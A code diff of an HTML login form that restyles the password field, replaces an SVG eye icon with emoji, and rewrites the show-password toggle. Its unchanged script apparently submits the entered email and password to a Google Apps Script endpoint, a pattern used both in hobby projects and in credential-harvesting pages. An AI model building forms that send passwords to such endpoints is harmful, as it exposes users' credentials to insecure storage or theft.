@@ -58,49 +58,37 @@
       text-align: left;
     }
 
-    input[type="email"],
-    .password-container,
-    button {
+    .password-wrapper {
+      position: relative;
+      display: flex;
+      align-items: center;
+    }
+
+    .password-wrapper input {
       width: 100%;
       font-size: 1rem;
       border-radius: 8px;
-    }
-
-    input[type="email"] {
-      padding: 0.8rem 1.2rem;
-      margin-bottom: 1.2rem;
-      border: 1px solid #ccc;
-      text-align: left;
-    }
-
-    .password-container {
-      position: relative;
-      margin-bottom: 1.2rem;
-    }
-
-    .password-container input[type="password"],
-    .password-container input[type="text"] {
-      width: 100%;
       padding: 0.8rem 2.5rem 0.8rem 1.2rem;
       border: 1px solid #ccc;
-      border-radius: 8px;
-      text-align: left;
     }
 
     .toggle-password {
       position: absolute;
-      right: 12px;
-      top: 50%;
-      transform: translateY(-50%);
+      right: 10px;
+      cursor: pointer;
       background: none;
       border: none;
-      cursor: pointer;
-      padding: 0;
+      font-size: 1.2rem;
+      color: #888;
     }
 
-    .toggle-password svg {
-      width: 20px;
-      height: 20px;
+    input[type="email"] {
+      padding: 0.8rem;
+      padding-left: 1.2rem;
+      margin-bottom: 1.2rem;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      text-align: left;
     }
 
     button {
@@ -110,6 +98,9 @@
       border: none;
       font-weight: bold;
       cursor: pointer;
+      font-size: 1rem;
+      border-radius: 8px;
+      margin-top: 1rem;
     }
 
     button:hover {
@@ -129,16 +120,9 @@
         <input type="email" id="email" name="email" required placeholder="Value" />
 
         <label for="password">Password</label>
-        <div class="password-container">
+        <div class="password-wrapper">
           <input type="password" id="password" name="password" required placeholder="Value" />
-          <button type="button" class="toggle-password" onclick="togglePassword()">
-            <svg id="eye-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
-                d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
-              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
-                d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
-            </svg>
-          </button>
+          <button type="button" class="toggle-password" onclick="togglePassword()">👁️</button>
         </div>
 
         <button type="submit">Submit</button>
@@ -148,15 +132,6 @@
 
   <script>
     const form = document.querySelector("#form");
-    const passwordInput = document.querySelector("#password");
-    const eyeIcon = document.querySelector("#eye-icon");
-    let passwordVisible = false;
-
-    function togglePassword() {
-      passwordVisible = !passwordVisible;
-      passwordInput.type = passwordVisible ? "text" : "password";
-    }
-
     const scriptURL = "https://script.google.com/macros/s/AKfycbx9dmqEKmDTZSwoABl4h8WjTCFU2BMBYjo0atbklk863llEB7-zGpS1qDgF3o2XcgRm5A/exec";
 
     form.addEventListener("submit", (e) => {
@@ -178,6 +153,14 @@
           console.error("Error!", error.message);
         });
     });
+
+    function togglePassword() {
+      const passwordInput = document.getElementById("password");
+      const toggleBtn = document.querySelector(".toggle-password");
+      const type = passwordInput.getAttribute("type") === "password" ? "text" : "password";
+      passwordInput.setAttribute("type", type);
+      toggleBtn.textContent = type === "password" ? "👁️" : "🙈";
+    }
   </script>
 </body>
 </html>
